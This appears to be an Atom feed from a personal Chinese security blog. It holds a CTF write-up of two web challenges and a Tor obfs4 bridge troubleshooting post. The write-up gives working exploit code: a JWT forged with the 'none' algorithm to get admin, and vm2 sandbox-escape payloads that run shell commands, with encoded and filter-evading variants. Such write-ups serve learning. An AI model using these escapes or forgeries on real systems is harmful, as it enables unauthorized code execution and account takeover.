<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggb0n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ggb0n.cool/"/>
  <updated>2020-04-22T00:16:34.984Z</updated>
  <id>http://ggb0n.cool/</id>
  
  <author>
    <name>ggb0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>虎符CTF两道web学习JS</title>
    <link href="http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-21T11:50:00.000Z</published>
    <updated>2020-04-22T00:16:34.984Z</updated>
    
    <content type="html"><![CDATA[<p>这次的虎符CTF没报上名也是可惜，不过朋友发来题目链接，打开一看是JS的题，还好没报名…😎 JS咱啥也不会呀，不过学习还是要学习的。<a id="more"></a></p><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>考察<code>NodeJS代码审计</code>、<code>JS弱类型</code>、<code>JWT伪造</code></p><h4 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h4><p>由于尚未专门学习JS，最近看到赛题就发怵，因为最近的比赛JS的题真是越来越多了😑，补充一些本题涉及的知识点先：</p><ul><li><p>1、NodeJS的框架目录结构</p><blockquote><ul><li>dispatch.js 主进程文件</li><li>worker.js 工作进程</li><li>app.js 应用</li><li>routes.js url路由表</li><li>package.json 依赖模块</li><li>config.js or config/ 配置文件</li><li>controllers/ 业务逻辑相关</li><li>views/ 试图模板</li><li>common/ 跟业务相关的公共模块</li><li>proxy/ 数据访问代理层</li><li>lib/ 跟业务无关的公共模块</li><li>assets/ images|scripts|styles</li><li>bin/ 相关运行脚本</li><li>node_moudules/</li></ul></blockquote><p>一般NodeJS的项目，访问<code>app.js</code>即可访问主文件的代码，而主要的逻辑代码在<code>controllers/api.js</code>中。</p></li><li><p>2、JS弱类型</p><p><code>弱类型</code>即指：数据类型可以被忽略, 一个变量可以赋不同数据类型的值，也可以在不同类型的变量之间进行操作，比如空数组<code>[]</code>与整数<code>1</code>做比较，返回为<code>true</code>；将浮点型数作为数组的索引等等。</p></li></ul><p>面对这个大潮流，JS还是要赶紧学学啊…</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>进入题目之后是个登录页面，没有其他按钮，那么我们看看源代码，可以看到<code>/static/js/app.js</code>的存在，访问之后看到提示：<code>或许该用 koa-static 来处理静态文件，路径该怎么配置？不管了先填个根目录XD</code>，提示<code>static</code>是直接映射到程序根目录的，那么应该可以直接在根目录下进行任意文件的访问，访问一下NodeJS的应用文件<code>app.js</code>试试，回显如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure><p>可以看到这里采用了NodeJS的<code>koa</code>框架，该框架的主要逻辑代码当然也是在<code>/controllers/api.js</code>中，果断读取。</p><p>访问<code>/controllers/api.js</code>拿到主要逻辑代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分析代码可知，主要包含三个路由：<code>/api/register</code>进行注册、<code>/api/login</code>进行登录，<code>/api/flag</code>读取flag，来分析一下代码逻辑。</p><p>首先是<code>register</code>路由：实现了注册账户的功能，通过接受传入的<code>username</code>和<code>password</code>，判断<code>username</code>不为<code>admin</code>之后，随机生成一个<code>secret</code>并为其分配一个<code>secretid</code>作为其在数组中的索引，然后利用<code>secretid</code>、<code>username</code>、 <code>password</code>、<code>secret</code>作为内容选用<code>HS256</code>进行加密，生成一个JWT令牌，此时<code>secret</code>也已经存入全局数组。</p><p><code>login</code>路由：对username检测之后，对登录状态的token进行了拼接，然后从其中提取了<code>secretid</code>的值作为索引去数组中读取<code>secret</code>的值，用该值对token进行验证，通过验证之后，将登录时的username赋值给session中的username。</p><p><code>flag</code>路由：判断username为admin之后，即打印flag。</p><p>至此，解题的思路也就很明确了，我们首先在注册账户时想办法伪造JWT为admin身份，然后用admin账户登录，即可拿到flag。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><h5 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h5><p>关键点就在于如何伪造JWT，代码中生成JWT令牌时采用的时<code>HS256</code>算法，并且<code>secret</code>时随机生成并存入数组中的，爆破怕是很难爆破出来，那就要想别的办法。这里用到的方法是利用<code>none</code>加密算法来伪造，原理如下：</p><blockquote><p>当加密时使用的是<code>none</code>算法，并且秘钥的值为<code>undefined</code>或空的时候，在验证时，即便后面的算法设置为 <code>HS256</code>，验证也还是按照<code>none</code>来进行并且通过验证。</p><p>造成这个漏洞的原因在于：这里验证的时候options选用的是<code>algorithm</code>，而依赖库中正确的是<code>algorithms</code>，正是这个原因造成了上面的漏洞。</p></blockquote><p>我们知道，这个题中在验证token的时候，选用了<code>HS256</code>算法对<code>(token, secret)</code>进行了验证，那么我们如果利用上面的方法去伪造一个用户名为<code>admin</code>、secret为空的JWT，那应该就能伪造成admin身份读取到flag了，不过还有个问题：</p><p>我们伪造的JWT中的<code>secretid</code>要满足<code>sid !== undefined</code>、<code>sid !== null</code>、<code>(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0) == true</code></p><p>那么就对我们伪造JWT时的secretid提出了较大的调整，不过问题不大，我们前面不是提到了JS的弱类型了嘛，其实我们传一个空数组<code>[]</code>、传一个浮点数<code>0.1</code>等等这些都是可以的啊，空口无凭，让我们实践出真知。</p><h5 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h5><p>访问<code>register</code>进行注册，返回了一个<code>JWT</code>令牌，解码看其中看其中内容：</p><p><img src="http://ggb0n.cool/images/hfctf.png" alt=""></p><p>嗯…没毛病，让我们来伪造JWT吧：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:[],<span class="string">"username"</span>: <span class="string">"admin"</span>,<span class="string">"password"</span>: <span class="string">"admin"</span>,<span class="string">"iat"</span>: <span class="number">1587472023</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure><p>得到伪造的JWT：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluIiwiaWF0IjoxNTg3NDcyMDIzfQ.</span><br></pre></td></tr></table></figure><p>然后拿着我们的令牌去登录，登录时在<code>authorization</code>填入伪造的JWT，注意登陆的<code>username</code>和<code>password</code>要与伪造的JWT里的一样（这里我们前面是已经用<code>test/test</code>进行注册了，也就是说已经初始化了<code>secrets</code>数组，这样也更不会造成逻辑上的问题）</p><p><img src="http://ggb0n.cool/images/hfctf1.png" alt=""></p><p>可以看到，此时的<code>status</code>为<code>true</code>，记下此时的<code>sses:aok</code>和<code>sses:aok.sig</code>，这个session中的username值其实已经赋值为admin了，也就是说，这个session是admin登录的session，拿着它就可以读取flag。</p><p>最后，我们去访问<code>/api/flag</code>路由，将记录下的token进行替换，即可伪造为admin身份拿到flag：</p><p><img src="http://ggb0n.cool/images/hfctf.2png" alt=""></p><p>拿到flag，撒花~</p><h3 id="JustEscape"><a href="#JustEscape" class="headerlink" title="JustEscape"></a>JustEscape</h3><p>考察<code>vm2沙箱逃逸</code>、<code>JS模板字符串</code>以及对字符串过滤的集中绕过方式</p><h4 id="知识补充-1"><a href="#知识补充-1" class="headerlink" title="知识补充"></a>知识补充</h4><p>JS模板字符串：</p><blockquote><p>模板字符串使用反引号` 来代替普通字符串中的用双引号和单引号。模板字符串可以包含特定语法（<code>&#39;${expression}&#39;</code>注意是单引号）的占位符。占位符中的表达式和周围的文本会一起传递给一个默认函数，该函数负责将所有的部分连接起来，如果一个模板字符串由表达式开头，则该字符串被称为带标签的模板字符串，该表达式通常是一个函数，它会在模板字符串处理后被调用，在输出最终结果前，你都可以通过该函数来对模板字符串进行操作处理。在模版字符串内使用反引号时，需要在它前面加转义符（\）。</p></blockquote><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>根据题目的提示，可以执行一些代码，这样的话岂不是直接<code>eval</code>就行了？但是题目提示<code>真的是PHP嘛</code>，emmm…假的吧，这里学到骚姿势，用<code>Error().stack</code>返回报错信息，来看后端采用的架构：</p><p><img src="http://ggb0n.cool/images/hfctf3.png" alt=""></p><p>可以看到后端是一个JS的<code>VM2</code>沙箱，进一步测试发现<code>&#39; &quot; +</code>都被ban掉了，不过利用现有的逃逸方法即可进行逃逸：<a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)逃逸exp</a></p><p>但是除了前面提到的被ban的字符外，很多函数，比如：<code>process</code>、<code>exec</code>、<code>eval</code>等也都被过滤了，触发黑名单就会赠送一个键盘：</p><p><img src="http://ggb0n.cool/images/hfctf4.png" alt=""></p><p>这里可以通过利用<code>字符串拼接</code>和<code>数组调用</code>（对象的方法或者属性名关键字被过滤的情况下可以把对象当成一个数组，然后数组里面的键名用字符串拼接出来）的方式来绕过关键字的限制，但是这里单、双引号都被ban了，直接进行字符串的拼接肯定是不行，不过可以利用<code>反引号</code>来代替单引号，同时利用<code>模板字符串嵌套</code>来拼接出需要的字符串。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure><p>输出<code>process</code></p><p>利用此方法对字符串进行拼接即可绕过过滤，对前面提到的exp进行改进即可成功逃逸。</p><p>另一种绕过方法是利用<code>base64</code>、<code>hex</code>编码进行绕过，不过都是在上面的逃逸exp基础上编码进行进一步绕过的方法。</p><h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p><strong>方法一：利用模板字符串嵌套绕过</strong></p><p>改进的exp如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>直接将上面的payload填入hackbar的URL栏执行即可：</p><p><img src="http://ggb0n.cool/images/hfctf5.png" alt=""></p><p><strong>方法二：利用base64/hex编码绕过</strong></p><p>首先贴一下逃逸的exp：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span> =&gt;</span> f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    e.get_process(<span class="function"><span class="params">()</span> =&gt;</span> &#123; &#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"cat /flag"</span>).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对前面的exp进行编码，进一步绕过过滤</p><p>base64编码payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure><p>hex编码payload：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="http://ggb0n.cool/images/hfctf6.png" alt=""></p><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>这两道题对逐步学习JS还是很有用滴，不过也恐慌了，感觉又啥也不会了😅</p><p>参考：<br><a href="https://www.zhaoj.in/read-6512.html">赵师傅的超详细题解</a><br><a href="https://github.com/patriksimek/vm2/issues/225">VM2(3.8.3)逃逸exp</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">JS模板字符串嵌套</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次的虎符CTF没报上名也是可惜，不过朋友发来题目链接，打开一看是JS的题，还好没报名…😎 JS咱啥也不会呀，不过学习还是要学习的。
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="JWT伪造" scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="JavaScript" scheme="http://ggb0n.cool/tags/JavaScript/"/>
    
      <category term="NodeJS" scheme="http://ggb0n.cool/tags/NodeJS/"/>
    
      <category term="JS沙箱逃逸" scheme="http://ggb0n.cool/tags/JS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
      <category term="JS模板字符串" scheme="http://ggb0n.cool/tags/JS%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
      <category term="JS弱类型" scheme="http://ggb0n.cool/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>obfs4网桥问题的处理</title>
    <link href="http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://ggb0n.cool/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/</id>
    <published>2020-04-16T01:52:29.000Z</published>
    <updated>2020-04-22T00:15:11.526Z</updated>
    
    <content type="html"><![CDATA[<p>昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣<a id="more"></a></p><h3 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h3><p>上午成功编译obfs4项目之后，随后就对<code>/etc/tor/torrc</code>文件做了如下的配置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Log notice file &#x2F;var&#x2F;log&#x2F;tor&#x2F;notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">ORPort 44443 #注意这个端口官方提供配置是443，不过443可能被占用导致tor启动失败，改一下就行</span><br><span class="line">Exitpolicy reject *:*</span><br><span class="line">BridgeRelay 1</span><br><span class="line">ServerTransportPlugin obfs4 exec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy</span><br><span class="line">ExtORPort auto</span><br><span class="line">PublishServerDescriptor 0</span><br></pre></td></tr></table></figure><p>然后重启tor服务：<code>service tor restart</code>，查看一下tor的运行状态是没问题，嗯，放心了。</p><p>然后<code>tail -F /var/log/tor/notices.log</code>，原本以为没问题，但是回显结果如下：<br><img src="http://ggb0n.cool/images/obfs4-1.png" alt=""></p><p>没错，报了如下错误：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[warn] Could not launch managed proxy executable at &#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;obfs4proxy&#39; (&#39;Permission denied&#39;).</span><br></pre></td></tr></table></figure><p>而成功的回显呢？<br><img src="http://ggb0n.cool/images/obfs4-2.png" alt=""></p><p>没错，是上面这种情况</p><p>然后就疯狂科学上网找解决方式，说是什么要以托管的方式运行，但是就是一直解决不了…</p><h3 id="发现猫腻"><a href="#发现猫腻" class="headerlink" title="发现猫腻"></a>发现猫腻</h3><p>是在多次尝试中，发现了疑似问题的<br>多次restart服务，发现tor服务都正常，当时当终端直接键入<code>tor</code>去运行的时候，就会报错，嗯？？？<br><img src="http://ggb0n.cool/images/obfs4-3.png" alt=""></p><p>不知道是端口占用还是进程没被杀死，但是这应该就是问题所在了，因为终端键入<code>tor</code>其实是执行tor这个程序，而<code>restart</code>是对tor服务的操作，服务成功运行不代表着tor启动了呀，tor不启动，那就不是以托管方式去运行obfs4proxy了呀，所有这就是问题！</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>由于最初是yum安装的tor，尝试重装无果，便选择了自己下载源码编译。</p><p>编译、安装完成之后，对<code>/usr/local/etc/tor</code>下的<code>torrc</code>进行前面提到的配置，然后执行可执行程序，在<code>/usr/local/bin</code>中。</p><p>以命令<code>./tor;tail -F /var/log/tor/notices.log</code>同时启动tor和网桥，回显如下：<br><img src="http://ggb0n.cool/images/obfs4-4.png" alt=""></p><p>good! 成功解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣
    
    </summary>
    
    
      <category term="瞎捉摸的一些学习" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="obfs4网桥搭建" scheme="http://ggb0n.cool/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="Linux" scheme="http://ggb0n.cool/tags/Linux/"/>
    
      <category term="Tor" scheme="http://ggb0n.cool/tags/Tor/"/>
    
      <category term="obfs4网桥" scheme="http://ggb0n.cool/tags/obfs4%E7%BD%91%E6%A1%A5/"/>
    
  </entry>
  
  <entry>
